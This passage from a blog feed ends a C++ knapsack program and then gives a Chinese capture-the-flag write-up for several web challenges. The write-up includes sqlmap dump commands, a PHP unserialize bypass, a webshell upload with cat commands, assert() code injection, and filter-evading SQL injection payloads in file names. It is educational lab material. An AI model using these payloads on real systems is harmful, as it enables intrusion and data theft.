p[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            jMax = min(w[i] - <span class="number">1</span>, c);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">                dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">                dp[i][j] = max(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j - w[i]] + p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">1</span>][c] = dp[<span class="number">2</span>][c];</span><br><span class="line">        <span class="keyword">if</span> (c &gt; w[<span class="number">1</span>])</span><br><span class="line">            dp[<span class="number">1</span>][c] = max(dp[<span class="number">2</span>][c], dp[<span class="number">2</span>][c - w[<span class="number">1</span>]] + p[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[<span class="number">1</span>][c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//printf("%lld\n", dp[1][c]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>Study Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web</title>
    <url>/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/</url>
    <content><![CDATA[<h1 id="ics-06（XCTF-4th-CyberEarth）"><a href="#ics-06（XCTF-4th-CyberEarth）" class="headerlink" title="ics-06（XCTF 4th-CyberEarth）"></a>ics-06（XCTF 4th-CyberEarth）</h1><p><strong>题目描述</strong>：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
<p>进入题目后，发现访问index.php会被跳转到index.php?id=1 而且还有写送分题，尝试sql注入无果，原来是一道脑洞题。<br>爆破id至id=2333，即得到flag。<br><img src="/2019/05/21/攻防世界Web/20190502225712244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h1 id="NewsCenter（-XCTF-4th-QCTF-2018）"><a href="#NewsCenter（-XCTF-4th-QCTF-2018）" class="headerlink" title="NewsCenter（ XCTF 4th-QCTF-2018）"></a>NewsCenter（ XCTF 4th-QCTF-2018）</h1><p>1、进入网站后，有一个搜索栏，抓包得：<br><img src="/2019/05/21/攻防世界Web/20190502230634849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2、怀疑<code>serch</code>为注入点，尝试sql注入。将报文保存下来，用sqlmap跑一下，发现可以直接出结果。</p>
<p>(1)<code>python2 sqlmap.py -r 1.txt --dbs</code><br><img src="/2019/05/21/攻防世界Web/20190502230859165.png" alt="在这里插入图片描述"><br>（2）<code>python2 sqlmap.py -r 2.txt -D &quot;news&quot; -T &quot;secret_table&quot; -C &quot;fl4g,id&quot; --dump</code><br><img src="/2019/05/21/攻防世界Web/20190502233415629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>疑问</strong>：<br>最后爆字段值的时候，如果只想得到<code>fl4g</code>列的字段会报错：<br><code>python2 sqlmap.py -r 2.txt -D &quot;news&quot; -T &quot;secret_table&quot; -C &quot;fl4g&quot; --dump</code><br><img src="/2019/05/21/攻防世界Web/2019050223401477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现此时sqlmap用的payload是：<br><code>search=123&#39; UNION ALL SELECT NULL,CONCAT(CONCAT(&#39;qqkqq&#39;,&#39;vvlrAdZPyMyCbSOJTgUbVOnivbMBieHDoFAFmACG&#39;),&#39;qjvbq&#39;),NULL-- qMtC</code><br>再根据报错信息，原因应该是<strong>联合查询注入字段间编码不同无法显示内容问题</strong>。<br>但是同时查询<code>fl4g</code>和<code>id</code></p>
<h1 id="lottery（XCTF-4th-QCTF-2018）"><a href="#lottery（XCTF-4th-QCTF-2018）" class="headerlink" title="lottery（XCTF 4th-QCTF-2018）"></a>lottery（XCTF 4th-QCTF-2018）</h1><p>打开题目先注册，然后发现flag可以购买。但得先去买彩票赢得足够的钱，七位数字的彩票，猜中的位数越多，赢得的钱越多，因此应该在买彩票这里出了一些漏洞。<br><img src="/2019/05/21/攻防世界Web/2019041623474711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>1、首先访问目录<code>robots.txt</code>，存在<code>.git</code>泄露。<br><img src="/2019/05/21/攻防世界Web/20190416234149623.png" alt="在这里插入图片描述"></p>
<p>2、利用工具<strong>GitHack</strong>，得到网站源码：<br><img src="/2019/05/21/攻防世界Web/20190416234519806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>3、进行代码审计，问题出现在<code>api.php</code>里的<code>buy</code>函数，这个函数就是用来判断是否猜中：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">	$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">	$win_numbers = random_win_nums();	<span class="comment">//中将号码由随机数函数生成</span></span><br><span class="line">	$same_count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;  <span class="comment">//这里用的'=='弱比较来判断每一位数是否猜中</span></span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> ($same_count) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			$prize = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			$prize = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			$prize = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			$prize = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			$prize = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			$prize = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			$prize = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$money += $prize - <span class="number">2</span>;</span><br><span class="line">	$_SESSION[<span class="string">'money'</span>] = $money;</span><br><span class="line">	response([<span class="string">'status'</span>=&gt;<span class="string">'ok'</span>,<span class="string">'numbers'</span>=&gt;$numbers, <span class="string">'win_numbers'</span>=&gt;$win_numbers, <span class="string">'money'</span>=&gt;$money, <span class="string">'prize'</span>=&gt;$prize]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>其中 <code>$numbers</code> 来自用户<code>json</code>输入 <code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1234567&quot;}</code>，没有检查数据类型。 </li>
<li>中奖号码<code>$win_numbers</code> 是随机生成的数字字符串。</li>
<li>判断逻辑使用的是 PHP 弱类型松散比较，因此比较好绕过，以<code>&quot;1&quot;</code>为例，和<code>TRUE</code>,<code>1</code>,<code>&quot;1&quot;</code>都相等。 </li>
</ul>
<p>（4）由于 json 支持布尔型数据，因此可以抓包改包。</p>
<p>抓到的包如下：<br><img src="/2019/05/21/攻防世界Web/20190416235806643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改完数据之后：<br><img src="/2019/05/21/攻防世界Web/20190416235912387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样改完之后，当函数在判断号码是否中奖时，每次都会判断<code>ture是否等于某个随机数</code>，这样只要随机数不是0，都将成功判断。<br>这样多发包几次，就可以赢得足够的钱来购买flag了：<br><img src="/2019/05/21/攻防世界Web/20190417000228755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="NaNNaNNaNNaN-Batman（tinyctf-2014）"><a href="#NaNNaNNaNNaN-Batman（tinyctf-2014）" class="headerlink" title="NaNNaNNaNNaN-Batman（tinyctf-2014）"></a>NaNNaNNaNNaN-Batman（tinyctf-2014）</h1><p>直接给了一个附件，里面是一段Javascript脚本，看起来有点奇怪，放在自己的环境里打开是一个输入框和一个提交按钮。<br><img src="/2019/05/21/攻防世界Web/20190417010640591.png" alt="在这里插入图片描述"><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">_=<span class="string">'function $()&#123;e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\'_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;	[0]);.splice(0,1)&#125;&#125;&#125;	\'&lt;input id="c"&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment'</span>;</span><br><span class="line"><span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">'	'</span>) <span class="keyword">with</span>(_.split($[Y]))_=join(pop());</span><br><span class="line"><span class="built_in">eval</span>(_)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>1、首先将最后的<code>eval(_)</code>改为<code>console.log(_)</code>，并用浏览器上的控制台运行这段代码，发现变量<code>_</code>是一个函数：<br><img src="/2019/05/21/攻防世界Web/2019041700513918.png" alt="在这里插入图片描述"><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> a=<span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure></p>
<p>2、审计代码，也就是在web100，也就是在一开始的输入框里输入的值要满足下面五个条件的判断才能执行下面的代码。<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">e</span>.length==16)</span><br><span class="line">       if(<span class="name">e</span>.match(<span class="name">/</span>^be0f23/)!=null)</span><br><span class="line">           if(<span class="name">e</span>.match(<span class="name">/233ac/</span>)!=null)</span><br><span class="line">               if(<span class="name">e</span>.match(<span class="name">/e98aa</span>$/)!=null)</span><br><span class="line">                   if(<span class="name">e</span>.match(<span class="name">/c7be9/</span>)!=null)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>输入的字符串长度必须为16个字符</li>
<li>字符串的开头必须要匹配<code>be0f23</code></li>
<li>字符串的结尾必须要匹配<code>e98aa</code></li>
<li>字符串中要能匹配到<code>233ac</code>和<code>c7be9</code></li>
</ul>
<p>因为限制了字符串的长度，因此这里要利用重叠来构造长度为16且满足所有正则表达式的字符串。<br>构造如下：<code>be0f233ac7be98aa</code></p>
<p>3、将上一步构造的字符串提交到那个输入框中，得到flag。<br><img src="/2019/05/21/攻防世界Web/20190417011505519.png" alt="在这里插入图片描述"><br><img src="/2019/05/21/攻防世界Web/20190417011519311.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>1、看名字就知道是一道反序列化的题目，打开网站看到:<br><img src="/2019/05/21/攻防世界Web/20190503005731647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、将该类的对象序列化后为：<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>每当序列化时都会执行<code>__wakeup()</code>函数，而这里明显需要绕过<code>__wakeup()</code>函数，通过<code>CVE-2016-7124</code>来绕过，简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行。</p>
<p>3、最终的payload：<code>?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br><img src="/2019/05/21/攻防世界Web/20190503010254761.png" alt="在这里插入图片描述"><br><br></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>1、进入题目，是一个上传界面，且只允许上传图片。<img src="/2019/05/21/攻防世界Web/20190503203530747.png" alt="在这里插入图片描述"><br>2、因为是前端检验，直接上传<code>shell.jpg</code>，BurpSuite抓包改后缀为<code>.php</code>。<br><img src="/2019/05/21/攻防世界Web/20190503203700124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>3、连接shell，在上一次目录里发现<code>flag.php</code>。<br><img src="/2019/05/21/攻防世界Web/20190503203746240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>4、再传入<code>pass=system(&#39;cat ../flag.php&#39;);</code>，在源码里得到flag。<br><img src="/2019/05/21/攻防世界Web/20190503203947402.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="mfw（csaw-ctf-2016-quals）"><a href="#mfw（csaw-ctf-2016-quals）" class="headerlink" title="mfw（csaw-ctf-2016-quals）"></a>mfw（csaw-ctf-2016-quals）</h1><p>1、进入题目，在<code>About</code>页面看到出题者使用了<code>Git</code>，再通过扫描目录确认存在<code>Git</code>泄露，利用GitHack工具得到源码。<br><img src="/2019/05/21/攻防世界Web/201905032118369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>2、源码里有<code>flag.php</code>文件，但是里面并没有flag，代码审计，在<code>index.php</code>里发现了问题。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">....................html code</span><br><span class="line"></span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				<span class="keyword">require_once</span> $file;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>3、发现<code>assert()</code>函数里，有我们可控的参数<code>$page</code>，而且并没有进行过滤，<strong><code>assert()</code>函数在验证断言之前将其参数解释为PHP代码</strong>。</p>
<p>因此构造如下<strong>payload</strong>：<code>&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>这样，注入后的语句就变成了：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/ ') or system('cat ./templates/flag.php');// .php', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure></p>
<p><code>//</code>后面的语句则被注释掉了。</p>
<p>得到flag：<br><img src="/2019/05/21/攻防世界Web/20190503215157117.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p>1、进入题目后，界面如下：<br><img src="/2019/05/21/攻防世界Web/20190503220927234.png" alt="在这里插入图片描述"><br>说实话，我卡了很久无从下手，最后得知是访问<code>index.phps</code>页面，说是看源码，但我其实并没有看到什么…</p>
<p>2、访问<code>index.phps</code>,看到如下源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>3、简单的代码审计，浏览器和代码都对传入的参数进行了对<code>urldecode</code>，因此只要对传入的<code>admin</code>进行两次<code>urlencode</code>。<br>构造payload：<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code><br><img src="/2019/05/21/攻防世界Web/20190503222010535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="FlatScience（Hack-lu-2017）"><a href="#FlatScience（Hack-lu-2017）" class="headerlink" title="FlatScience（Hack.lu-2017）"></a>FlatScience（Hack.lu-2017）</h1><p>1、首先访问<code>robots.txt</code>页面，发现提示了有<code>/login.php</code>和<code>/admin.php</code>两个页面。<br><img src="/2019/05/21/攻防世界Web/2019050923484960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、在<code>login.php</code>中F12发现：<br><img src="/2019/05/21/攻防世界Web/20190510000045729.png" alt="在这里插入图片描述"><br>于是尝试<code>?debug</code>可以得到源码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ob_start(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">-------------------------------------</span><br><span class="line">              html code</span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123; </span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>]; </span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>]; </span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>); </span><br><span class="line">         </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>); </span><br><span class="line">    <span class="keyword">if</span>($res)&#123; </span><br><span class="line">        $row = $res-&gt;fetchArray(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123; </span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>); </span><br><span class="line">            header(<span class="string">"Location: /"</span>); </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) </span><br><span class="line">highlight_file(<span class="string">'login.php'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>数据库查询的语句为：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'$id'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'sha1($pass."Salz!")'</span></span><br></pre></td></tr></table></figure></p>
<p>通过POST接收usr和pw参数，没有做任何过滤，带入sql查询。若查询的结果id字段不为空，则执行setcookie操作，会将查询的结果name字段插入到cookie中。</p>
<p>上述语句中的<code>$user</code>是可控的，即login页面中id输入框中的内容，因此可以通过注入将后面的语句注释掉，这样子就可以进行注入。</p>
<p><br></p>
<h1 id="upload（RCTF-2015）"><a href="#upload（RCTF-2015）" class="headerlink" title="upload（RCTF 2015）"></a>upload（RCTF 2015）</h1><p>1、先进入页面发现是一个登陆界面，注册账号进去之后是一个上传页面，上传一个文件之后会先返回成功上传并回显你的<code>uid</code>。<br><img src="/2019/05/21/攻防世界Web/2019051814501943.png" alt="在这里插入图片描述"><br>然后再回到上传页面发现你上传的文件名会显示在页面上，这种情况判断是否由文件名导致xss或者文件名的注入，查看页面源码，发现文件名中的引号等符号会被转义，因此排除了xss。</p>
<p>并且通过回显的文件名可以判断，过滤了<code>select</code>,<code>from</code>等关键词（通过双写绕过），这样就明确了利用文件名进行注入。</p>
<p>2、注入可以有两种方式，即未知表的结构和已猜测到表的结构（某大佬writeup中）。</p>
<p>（1）当你不知道表的结构时，只能先大致推测后台的insert插入语句：<br><code>insert into 表名(&#39;filename&#39;,...) values(&#39;你上传的文件名&#39;,...);</code></p>
<p>这样可以<strong>构造</strong>下列文件名进行注入：<br><code>文件名&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg</code></p>
<p>拼接后的sql语句为：<br><code>...values(&#39;文件名&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg&#39;,...);</code></p>
<ul>
<li>这里<code>hex()</code>函数将字符串转换为16进制，而<code>conv(str,16,10)</code>则将str由16进制再转换为10进制</li>
<li>然后利用了mysql的隐式类型转换，其实就是当字符串与整数相加时，会当作整数来解释，例如：<br><img src="/2019/05/21/攻防世界Web/20190518145705642.png" alt="在这里插入图片描述"></li>
<li>而之所以还要用到<code>substr()</code>是因为当查询的字符串太长时，转换为10进制就会用科学记数法来表示，这样就没办法再转换为字符串了，因此需要用<code>substr()</code>来将长字符串分段进行查询。<br><img src="/2019/05/21/攻防世界Web/20190518145924663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<p>通过这种方式，就可以一步步的查询到flag了。</p>
<p>全部payload:<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）查询数据库:</span><br><span class="line">lethe <span class="string">'+(selselectect conv(substr(hex(database()),1,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">131277325825392</span> 转<span class="number">16</span>进制再转字符得：web_up</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(selselectect conv(substr(hex(database()),13,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">1819238756</span> 转<span class="number">16</span>进制再转字符得：load</span><br><span class="line"></span><br><span class="line">拼接起来得知数据库名为:web_upload</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）然后查表:</span><br><span class="line">lethe<span class="string">'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = '</span>web_upload<span class="string">' limit 1,1)),1,12),16,10))+'</span>.jpg</span><br><span class="line">返回:</span><br><span class="line"><span class="number">114784820031327</span> 转<span class="number">16</span>进制再转字符得：hello_</span><br><span class="line"></span><br><span class="line">lethe<span class="string">'+(seleselectct+conv(substr(hex((selselectect TABLE_NAME frfromom 